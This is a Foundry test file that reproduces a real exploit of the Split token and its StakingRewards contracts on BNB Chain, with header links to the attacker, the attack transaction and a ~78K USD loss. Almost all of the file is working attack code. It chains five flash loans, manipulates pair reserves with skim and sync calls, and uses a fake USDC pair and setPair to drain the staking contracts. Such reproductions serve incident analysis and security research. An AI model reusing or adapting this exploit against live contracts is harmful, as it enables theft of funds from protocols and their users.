// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~78K USD$
// Attacker : https://bscscan.com/address/0x7ccf451d3c48c8bb747f42f29a0cde4209ff863e
// Attack Contract : https://bscscan.com/address/0xa7fe9c5d4b87b0d03e9bb99f4b4e76785de26b5d
// Vulnerable Contract : https://bscscan.com/address/0xc98e183d2e975f0567115cb13af893f0e3c0d0bd
// Attack Tx : https://bscscan.com/tx/0x2b0877b5495065e90d956e44ffde6aaee5e0fcf99dd3c86f5ff53e33774ea52d

// @Analysis
// https://twitter.com/CertiKAlert/status/1705966214319612092

interface IStakingRewards {
    function stake(address token, address token1, address token2, address up, uint256 amount) external;

    function sell(address token, address token1, uint256 amount) external;
}

interface ISplit is IERC20 {
    function setPair(address token) external;
}

contract ContractTest is Test {
    Uni_Pair_V2 private constant BUSDT_KUB_LP = Uni_Pair_V2(0x39aDFE6ec5a19bb573a2Fd8A5028031C0dc57600);
    Uni_Pair_V2 private constant KUB_Split = Uni_Pair_V2(0x16bF07CC3b84c6C2F97c32a6C66aEB726AbfC570);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant KUB = IERC20(0x808602d91e58f2d58D7C09306044b88234ab4628);
    ISplit private constant Split = ISplit(0xc98E183D2e975F0567115CB13AF893F0E3c0d0bD);
    IERC20 private constant fakeUSDC = IERC20(0xa88D48a4c6D8dD6a166A71CC159A2c588Fa882BB);
    IDPPOracle private constant DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle private constant DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle private constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle private constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V2 private constant PancakeRouter1 = Uni_Router_V2(0xfDE81E1f340C3ec271142723781df9e685653213);
    Uni_Router_V2 private constant PancakeRouter2 = Uni_Router_V2(0x5D82aeA1fE75CB40AfE792dAe1cf76EA8E2808CE);
    IStakingRewards private constant StakingRewards1 = IStakingRewards(0x26Eea9ff2f3caDec4d6Fc4f462F677b58AB31Ab0);
    IStakingRewards private constant StakingRewards2 = IStakingRewards(0x3A006dD44a4a0e43C942f57d452a6a7Ada25AdC3);
    Uni_Pair_V2 private constant BUSDT_Split = Uni_Pair_V2(0xe4D038DE672e226877Db8FA2670C5ba9778155fF);
    address private constant BUSDT_KUB = 0x1E338D9Db6bb78cFd8eE1F756907899C006711AF;
    address private constant upAddressForStake = 0x67Bf514E9e07b2F95C8805f9a035f60512384d1c;
    address private constant exploiter = 0x7Ccf451D3c48C8bb747f42F29A0CdE4209FF863e;

    function setUp() public {
        vm.createSelectFork("bsc", 32_021_100 - 1);
        vm.label(address(BUSDT_KUB_LP), "BUSDT_KUB_LP");
        vm.label(address(KUB_Split), "KUB_Split");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(KUB), "KUB");
        vm.label(address(Split), "Split");
        vm.label(address(fakeUSDC), "fakeUSDC");
        vm.label(address(DPPOracle1), "DPPOracle1");
        vm.label(address(DPPOracle2), "DPPOracle2");
        vm.label(address(DPPOracle3), "DPPOracle3");
        vm.label(address(DPPAdvanced), "DPPAdvanced");
        vm.label(address(DPP), "DPP");
        vm.label(address(Router), "Router");
        vm.label(address(PancakeRouter1), "PancakeRouter1");
        vm.label(address(PancakeRouter2), "PancakeRouter2");
        vm.label(address(StakingRewards1), "StakingRewards1");
        vm.label(address(StakingRewards2), "StakingRewards2");
        vm.label(BUSDT_KUB, "BUSDT_KUB");
        vm.label(address(BUSDT_Split), "BUSDT_Split");
        vm.label(upAddressForStake, "upAddressForStake");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        deal(address(fakeUSDC), address(this), 10_000 * 1e18);

        emit log_named_decimal_uint(
            "Attacker BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        emit log_named_decimal_uint("Attacker KUB balance before attack", KUB.balanceOf(address(this)), KUB.decimals());

        emit log_named_decimal_uint(
            "Attacker Split balance before attack", Split.balanceOf(address(this)), Split.decimals()
        );

        BUSDT_KUB_LP.sync();

        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), abi.encode(0));

        emit log_named_decimal_uint(
            "Attacker BUSDT balance after attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        emit log_named_decimal_uint("Attacker KUB balance after attack", KUB.balanceOf(address(this)), KUB.decimals());

        emit log_named_decimal_uint(
            "Attacker Split balance after attack", Split.balanceOf(address(this)), Split.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (abi.decode(data, (uint256)) == uint256(0)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), abi.encode(1));
        } else if (abi.decode(data, (uint256)) == uint256(1)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), abi.encode(2));
        } else if (abi.decode(data, (uint256)) == uint256(2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), abi.encode(3));
        } else if (abi.decode(data, (uint256)) == uint256(3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), abi.encode(4));
        } else {
            BUSDT.approve(address(Router), type(uint256).max);
            BUSDT.approve(address(StakingRewards1), type(uint256).max);

            BUSDTToKUB();
            KUB.transfer(address(KUB_Split), KUB.balanceOf(address(this)) - 10);
            KUB_Split.sync();

            BUSDTToSplit();
            StakingRewards1.stake(address(KUB), address(BUSDT), address(BUSDT), upAddressForStake, 1000e18);

            uint8 i;
            while (i < 30) {
                Split.transfer(address(this), 0);
                ++i;
            }

            Split.transfer(address(BUSDT_Split), 0);
            BUSDT_Split.skim(address(this));
            Split.transfer(address(KUB_Split), 0);
            KUB.transfer(address(KUB_Split), 1);
            KUB_Split.skim(address(this));
            Split.transfer(address(KUB_Split), 0);
            KUB_Split.sync();
            for (i = 0; i < 2; ++i) {
                BUSDT_Split.skim(address(this));
            }
            // Amount of Split to send to pair later
            uint256 amountSplit = Split.balanceOf(address(BUSDT_Split)) * 2;
            // Exploit
            // Creating pair with original fake USDC token deployed by attacker before
            address fakeUSDC_Split = IUniswapV2Factory(Router.factory()).createPair(address(fakeUSDC), address(Split));
            // Tx.origin must be exploiter eoa here (because original fake USDC contract is in use and exploiter addr is required to transfer)
            vm.startPrank(address(this), exploiter);
            // Send tokens to newly created token pair - USDC-Split
            fakeUSDC.transfer(fakeUSDC_Split, 1e6);
            Split.transfer(fakeUSDC_Split, amountSplit);
            Uni_Pair_V2(fakeUSDC_Split).sync();

            Split.setPair(address(fakeUSDC));
            fakeUSDC.approve(address(Router), type(uint256).max);
            // Swap fakeUSDC => Split => BUSDT
            fakeUSDCToBUSDT();
            vm.stopPrank();

            Split.approve(address(StakingRewards2), type(uint256).max);
            KUB.approve(address(StakingRewards1), type(uint256).max);

            i = 0;
            while (i < 100) {
                (uint112 reserveKUB, uint112 reserveSplit,) = KUB_Split.getReserves();
                uint256 amountOutKUB = calcAmountOut(KUB_Split, StakingRewards2, reserveKUB, KUB);

                uint256 amountInSplit = PancakeRouter2.getAmountIn(amountOutKUB, reserveSplit, reserveKUB);

                if (Split.balanceOf(address(this)) <= ((amountInSplit * 2) * 9) / 10) {
                    StakingRewards2.sell(address(Split), address(KUB), amountInSplit);
                } else {
                    StakingRewards2.sell(address(Split), address(KUB), ((amountInSplit * 2) * 9) / 10);
                }
                ++i;
            }

            i = 0;
            while (i < 10) {
                (uint112 reserveBUSDT, uint112 reserveKUB,) = BUSDT_KUB_LP.getReserves();
                uint256 amountOutBUSDT = calcAmountOut(BUSDT_KUB_LP, StakingRewards1, reserveBUSDT, BUSDT);
                uint256 amountInKUB = PancakeRouter1.getAmountIn(amountOutBUSDT, reserveKUB, reserveBUSDT);

                StakingRewards1.sell(address(KUB), address(BUSDT), amountInKUB);

                ++i;
            }
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function BUSDTToKUB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(KUB);
        Router.swapExactTokensForTokens(BUSDT.balanceOf(BUSDT_KUB) * 2, 0, path, address(this), block.timestamp + 1000);
    }

    function BUSDTToSplit() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(Split);
        Router.swapExactTokensForTokens(
            BUSDT.balanceOf(address(BUSDT_Split)) * 2, 0, path, address(this), block.timestamp + 1000
        );
    }

    function fakeUSDCToBUSDT() internal {
        address[] memory path = new address[](3);
        path[0] = address(fakeUSDC);
        path[1] = address(Split);
        path[2] = address(BUSDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            fakeUSDC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    function calcAmountOut(
        Uni_Pair_V2 pool,
        IStakingRewards stakingRewards,
        uint112 reserve,
        IERC20 token
    ) internal view returns (uint256) {
        uint256 a = pool.totalSupply() * 1000;
        uint256 b = pool.balanceOf(address(stakingRewards)) * 7;
        uint256 c = (b * reserve) / a;
        return (token.balanceOf(address(stakingRewards)) + c);
    }
}
